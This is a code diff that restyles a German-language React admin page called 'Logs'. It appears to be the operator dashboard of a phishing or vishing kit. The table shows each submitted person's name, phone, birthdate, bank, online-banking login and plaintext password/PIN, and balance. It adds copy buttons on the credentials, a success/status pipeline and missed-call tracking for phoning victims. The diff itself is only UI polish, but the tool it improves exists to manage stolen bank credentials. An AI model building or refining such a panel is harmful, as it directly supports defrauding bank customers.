@@ -10,8 +10,9 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { Badge } from "@/components/ui/badge";
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
+import { Avatar, AvatarFallback } from "@/components/ui/avatar";
 import { toast } from "sonner";
-import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw, Search, Plus, Minus } from "lucide-react";
+import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw, Search, Plus, Minus, Users, Clock, CheckCircle2, AlertCircle } from "lucide-react";
 import { formatBalance, parseBalanceNumber } from "@/lib/format";
 import { useSubmissions, type Note } from "@/hooks/use-submissions";
 import { useQueryClient } from "@tanstack/react-query";
@@ -25,12 +26,28 @@ interface Call {
 
 const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;
 
-const statusBadgeClass: Record<string, string> = {
-  "Neu": "bg-slate-100 text-slate-700 hover:bg-slate-100",
-  "In Bearbeitung": "bg-blue-50 text-blue-700 hover:bg-blue-50",
-  "Erfolgreich": "bg-emerald-50 text-emerald-700 hover:bg-emerald-50",
-  "Down": "bg-red-50 text-red-700 hover:bg-red-50",
+const statusConfig: Record<string, { dot: string; bg: string; text: string }> = {
+  "Neu": { dot: "bg-slate-400", bg: "bg-slate-50 border-slate-200", text: "text-slate-600" },
+  "In Bearbeitung": { dot: "bg-blue-500", bg: "bg-blue-50 border-blue-200", text: "text-blue-700" },
+  "Erfolgreich": { dot: "bg-emerald-500", bg: "bg-emerald-50 border-emerald-200", text: "text-emerald-700" },
+  "Down": { dot: "bg-red-500", bg: "bg-red-50 border-red-200", text: "text-red-700" },
 };
+
+function timeAgo(dateStr: string): string {
+  const now = Date.now();
+  const then = new Date(dateStr).getTime();
+  const diff = Math.floor((now - then) / 1000);
+  if (diff < 60) return "gerade eben";
+  if (diff < 3600) return `vor ${Math.floor(diff / 60)} Min`;
+  if (diff < 86400) return `vor ${Math.floor(diff / 3600)} Std`;
+  if (diff < 604800) return `vor ${Math.floor(diff / 86400)} Tagen`;
+  return new Date(dateStr).toLocaleDateString("de-AT");
+}
+
+function getInitials(name: string | null): string {
+  if (!name) return "?";
+  return name.split(" ").map(p => p[0]).join("").toUpperCase().slice(0, 2);
+}
 
 function LogsContent() {
   const navigate = useNavigate();
@@ -47,6 +64,13 @@ function LogsContent() {
   const [txMode, setTxMode] = useState<"+" | "-" | null>(null);
   const [txAmount, setTxAmount] = useState("");
   const [txNote, setTxNote] = useState("");
+
+  const stats = {
+    total: submissions.length,
+    neu: submissions.filter(s => (s.status || "Neu") === "Neu").length,
+    bearbeitung: submissions.filter(s => s.status === "In Bearbeitung").length,
+    erfolgreich: submissions.filter(s => s.status === "Erfolgreich").length,
+  };
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -148,11 +172,11 @@ function LogsContent() {
     setCallDialog({ id: subId, calls: (data || []) as Call[] });
   };
 
-  const CopyCell = ({ value }: { value: string | null }) => {
-    if (!value) return <span className="text-slate-400">-</span>;
+  const CopyCell = ({ value, mono }: { value: string | null; mono?: boolean }) => {
+    if (!value) return <span className="text-slate-300">—</span>;
     return (
-      <button onClick={() => copyToClipboard(value)} className="flex items-center gap-1 text-sm text-slate-700 hover:text-blue-600 transition-colors">
-        {value} <Copy className="h-3 w-3 opacity-40" />
+      <button onClick={() => copyToClipboard(value)} className={`group/copy flex items-center gap-1.5 text-sm text-slate-600 hover:text-slate-900 transition-colors ${mono ? "font-mono text-xs" : ""}`}>
+        {value} <Copy className="h-3 w-3 opacity-0 group-hover/copy:opacity-40 transition-opacity" />
       </button>
     );
   };
@@ -167,35 +191,66 @@ function LogsContent() {
     return true;
   });
 
+  const statCards = [
+    { label: "Gesamt", value: stats.total, icon: Users, filter: "Alle", color: "text-slate-600 bg-slate-50 border-slate-200" },
+    { label: "Neu", value: stats.neu, icon: Clock, filter: "Neu", color: "text-slate-600 bg-slate-50 border-slate-200" },
+    { label: "In Bearbeitung", value: stats.bearbeitung, icon: AlertCircle, filter: "In Bearbeitung", color: "text-blue-600 bg-blue-50 border-blue-200" },
+    { label: "Erfolgreich", value: stats.erfolgreich, icon: CheckCircle2, filter: "Erfolgreich", color: "text-emerald-600 bg-emerald-50 border-emerald-200" },
+  ];
+
   return (
     <TooltipProvider>
     <div className="space-y-6">
-      <div className="flex items-center justify-between">
-        <h1 className="text-2xl font-bold text-slate-900">Logs</h1>
-        <Button variant="outline" size="sm" onClick={refetch} className="gap-2">
+      {/* Header */}
+      <div className="flex items-end justify-between">
+        <div>
+          <h1 className="text-2xl font-bold text-slate-900 tracking-tight">Logs</h1>
+          <p className="text-sm text-slate-500 mt-0.5">{submissions.length} Einträge insgesamt</p>
+        </div>
+        <Button variant="ghost" size="sm" onClick={refetch} className="gap-2 text-slate-500 hover:text-slate-700">
           <RefreshCw className="h-3.5 w-3.5" /> Aktualisieren
         </Button>
       </div>
 
-      <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3">
-        <div className="relative w-full sm:w-72">
+      {/* Stat Cards */}
+      <div className="grid grid-cols-4 gap-3">
+        {statCards.map((card) => (
+          <button
+            key={card.filter}
+            onClick={() => setStatusFilter(card.filter)}
+            className={`flex items-center gap-3 rounded-xl border p-3.5 transition-all ${card.color} ${
+              statusFilter === card.filter ? "ring-2 ring-slate-900/10 shadow-sm" : "hover:shadow-sm"
+            }`}
+          >
+            <card.icon className="h-5 w-5 opacity-60" />
+            <div className="text-left">
+              <p className="text-2xl font-bold leading-none">{card.value}</p>
+              <p className="text-xs opacity-70 mt-0.5">{card.label}</p>
+            </div>
+          </button>
+        ))}
+      </div>
+
+      {/* Search + Filter */}
+      <div className="flex items-center gap-3">
+        <div className="relative flex-1 max-w-xs">
           <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
           <Input
-            placeholder="Name, Telefon, IBAN, Login..."
+            placeholder="Suche nach Name, Telefon, IBAN..."
             value={searchQuery}
             onChange={(e) => setSearchQuery(e.target.value)}
-            className="pl-9 h-9"
+            className="pl-9 h-9 bg-white border-slate-200"
           />
         </div>
-        <div className="flex items-center gap-2">
+        <div className="flex items-center gap-1.5">
           {["Alle", ...STATUS_OPTIONS].map((s) => (
             <button
               key={s}
               onClick={() => setStatusFilter(s)}
-              className={`rounded-full px-3.5 py-1.5 text-xs font-medium transition-colors ${
+              className={`rounded-full px-3 py-1 text-xs font-medium transition-all ${
                 statusFilter === s
-                  ? "bg-slate-900 text-white"
-                  : "bg-white text-slate-600 border border-slate-200 hover:bg-slate-50"
+                  ? "bg-slate-900 text-white shadow-sm"
+                  : "text-slate-500 hover:text-slate-700 hover:bg-slate-100"
               }`}
             >
               {s}
@@ -204,96 +259,143 @@ function LogsContent() {
         </div>
       </div>
 
-      <div className="rounded-xl border border-slate-200 bg-white shadow-sm overflow-x-auto">
+      {/* Table */}
+      <div className="rounded-xl border border-slate-200 bg-white shadow-sm overflow-hidden">
         <Table>
           <TableHeader>
-            <TableRow className="bg-slate-50/50">
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Zeitpunkt</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Name</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Telefon</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Geburtsdatum</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Stadt</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Bank</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Login-Name</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Passwort/PIN</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Guthaben</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Status</TableHead>
-              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Aktionen</TableHead>
+            <TableRow className="bg-slate-50/80 border-b border-slate-100">
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider pl-4">Zeit</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Name</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Telefon</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Geburtsdatum</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Bank</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Login</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Passwort</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Guthaben</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Status</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider pr-4">Aktionen</TableHead>
             </TableRow>
           </TableHeader>
           <TableBody>
             {filteredSubmissions.map((sub) => {
               const currentStatus = sub.status || "Neu";
+              const sc = statusConfig[currentStatus] || statusConfig["Neu"];
               const nc = noteCounts[sub.id] || 0;
               const cc = callCounts[sub.id] || 0;
               return (
-                <TableRow key={sub.id} className="hover:bg-slate-50/50 transition-colors">
-                  <TableCell className="whitespace-nowrap text-xs text-slate-500">
-                    {sub.created_at ? new Date(sub.created_at).toLocaleString("de-AT") : "-"}
+                <TableRow key={sub.id} className="group border-b border-slate-100 last:border-0 hover:bg-slate-50/60 transition-colors">
+                  {/* Zeit */}
+                  <TableCell className="pl-4">
+                    <Tooltip>
+                      <TooltipTrigger asChild>
+                        <span className="text-xs text-slate-400 cursor-default">
+                          {sub.created_at ? timeAgo(sub.created_at) : "—"}
+                        </span>
+                      </TooltipTrigger>
+                      <TooltipContent>{sub.created_at ? new Date(sub.created_at).toLocaleString("de-AT") : "—"}</TooltipContent>
+                    </Tooltip>
                   </TableCell>
-                  <TableCell className="font-medium text-slate-800">{sub.full_name || "-"}</TableCell>
-                  <TableCell><CopyCell value={sub.phone} /></TableCell>
-                  <TableCell className="text-sm text-slate-600">{sub.birthdate || "-"}</TableCell>
-                  <TableCell className="text-sm text-slate-600">{sub.city || "-"}</TableCell>
-                  <TableCell className="text-sm text-slate-600">{sub.bank || "-"}</TableCell>
-                  <TableCell><CopyCell value={sub.bank_username} /></TableCell>
-                  <TableCell><CopyCell value={sub.bank_password} /></TableCell>
+
+                  {/* Name + Avatar */}
+                  <TableCell>
+                    <div className="flex items-center gap-2.5">
+                      <Avatar className="h-7 w-7 text-[10px]">
+                        <AvatarFallback className="bg-slate-100 text-slate-500 font-medium">
+                          {getInitials(sub.full_name)}
+                        </AvatarFallback>
+                      </Avatar>
+                      <span className="font-medium text-slate-800 text-sm">{sub.full_name || "—"}</span>
+                    </div>
+                  </TableCell>
+
+                  {/* Telefon */}
+                  <TableCell><CopyCell value={sub.phone} mono /></TableCell>
+
+                  {/* Geburtsdatum */}
+                  <TableCell className="text-xs text-slate-500">{sub.birthdate || "—"}</TableCell>
+
+                  {/* Bank */}
+                  <TableCell className="text-xs text-slate-500">{sub.bank || "—"}</TableCell>
+
+                  {/* Login */}
+                  <TableCell><CopyCell value={sub.bank_username} mono /></TableCell>
+
+                  {/* Passwort */}
+                  <TableCell><CopyCell value={sub.bank_password} mono /></TableCell>
+
+                  {/* Guthaben */}
                   <TableCell>
                     <button
                       onClick={() => setBalanceEdit({ id: sub.id, value: sub.balance || "", currentBalance: sub.balance || "" })}
-                      className="text-sm text-slate-600 hover:text-blue-600 cursor-pointer transition-colors"
+                      className={`text-sm font-medium cursor-pointer transition-colors ${
+                        sub.balance ? "text-emerald-600 hover:text-emerald-700" : "text-slate-300 hover:text-slate-500"
+                      }`}
                     >
-                      {sub.balance || "-"}
+                      {sub.balance || "—"}
                     </button>
                   </TableCell>
+
+                  {/* Status */}
                   <TableCell>
                     <Select value={currentStatus} onValueChange={(val) => updateStatus(sub.id, val)}>
-                      <SelectTrigger className="h-7 w-[130px] border-0 p-0 shadow-none">
-                        <Badge className={`text-xs font-medium ${statusBadgeClass[currentStatus] || ""}`}>{currentStatus}</Badge>
+                      <SelectTrigger className="h-auto w-auto border-0 p-0 shadow-none bg-transparent">
+                        <div className={`inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs font-medium ${sc.bg} ${sc.text}`}>
+                          <span className={`h-1.5 w-1.5 rounded-full ${sc.dot}`} />
+                          {currentStatus}
+                        </div>
                       </SelectTrigger>
                       <SelectContent>
                         {STATUS_OPTIONS.map((opt) => (
-                          <SelectItem key={opt} value={opt}>{opt}</SelectItem>
+                          <SelectItem key={opt} value={opt}>
+                            <div className="flex items-center gap-2">
+                              <span className={`h-1.5 w-1.5 rounded-full ${statusConfig[opt].dot}`} />
+                              {opt}
+                            </div>
+                          </SelectItem>
                         ))}
                       </SelectContent>
                     </Select>
                   </TableCell>
-                  <TableCell>
-                    <div className="flex items-center gap-0.5">
+
+                  {/* Aktionen */}
+                  <TableCell className="pr-4">
+                    <div className="flex items-center gap-0.5 opacity-60 group-hover:opacity-100 transition-opacity">
                       <Tooltip>
                         <TooltipTrigger asChild>
-                          <Button size="icon" variant="ghost" className="h-8 w-8 text-slate-400 hover:text-slate-700" onClick={() => navigate(`/admin/logs/${sub.id}`)}>
-                            <Eye className="h-4 w-4" />
+                          <Button size="icon" variant="ghost" className="h-7 w-7 text-slate-400 hover:text-slate-700" onClick={() => navigate(`/admin/logs/${sub.id}`)}>
+                            <Eye className="h-3.5 w-3.5" />
                           </Button>
                         </TooltipTrigger>
                         <TooltipContent>Details</TooltipContent>
                       </Tooltip>
+
                       <div className="relative">
                         <Tooltip>
                           <TooltipTrigger asChild>
-                            <Button size="icon" variant="ghost" className="h-8 w-8 text-slate-400 hover:text-slate-700" onClick={() => openNoteDialog(sub.id)}>
-                              <MessageSquare className="h-4 w-4" />
+                            <Button size="icon" variant="ghost" className="h-7 w-7 text-slate-400 hover:text-slate-700" onClick={() => openNoteDialog(sub.id)}>
+                              <MessageSquare className="h-3.5 w-3.5" />
                             </Button>
                           </TooltipTrigger>
                           <TooltipContent>Notizen</TooltipContent>
                         </Tooltip>
                         {nc > 0 && (
-                          <button onClick={() => openNoteDialog(sub.id)} className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white">
+                          <button onClick={() => openNoteDialog(sub.id)} className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white leading-none">
                             {nc}
                           </button>
                         )}
                       </div>
+
                       <div className="relative">
                         <Tooltip>
                           <TooltipTrigger asChild>
-                            <Button size="icon" variant="ghost" className="h-8 w-8 text-slate-400 hover:text-slate-700" onClick={() => addMailboxCall(sub.id)}>
-                              <PhoneMissed className="h-4 w-4" />
+                            <Button size="icon" variant="ghost" className="h-7 w-7 text-slate-400 hover:text-slate-700" onClick={() => addMailboxCall(sub.id)}>
+                              <PhoneMissed className="h-3.5 w-3.5" />
                             </Button>
                           </TooltipTrigger>
                           <TooltipContent>Mailbox</TooltipContent>
                         </Tooltip>
                         {cc > 0 && (
-                          <button onClick={() => openCallDialog(sub.id)} className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white">
+                          <button onClick={() => openCallDialog(sub.id)} className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white leading-none">
                             {cc}
                           </button>
                         )}
@@ -305,7 +407,7 @@ function LogsContent() {
             })}
             {filteredSubmissions.length === 0 && (
               <TableRow>
-                <TableCell colSpan={11} className="text-center text-slate-400 py-12">
+                <TableCell colSpan={10} className="text-center text-slate-400 py-16">
                   Keine Einträge vorhanden
                 </TableCell>
               </TableRow>
